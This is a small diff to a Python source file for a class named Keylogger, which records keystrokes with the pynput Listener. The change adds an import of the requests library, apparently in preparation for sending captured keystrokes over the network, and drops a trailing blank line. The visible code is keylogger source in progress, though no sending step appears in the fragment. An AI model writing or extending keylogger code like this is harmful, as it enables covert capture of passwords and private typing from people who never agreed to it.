@@ -1,5 +1,6 @@
 import pynput
 from pynput.keyboard import Key, Listener
+import requests
 
 
 class Keylogger:
@@ -32,4 +33,3 @@ class Keylogger:
     def keylogger(self):
         with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
-
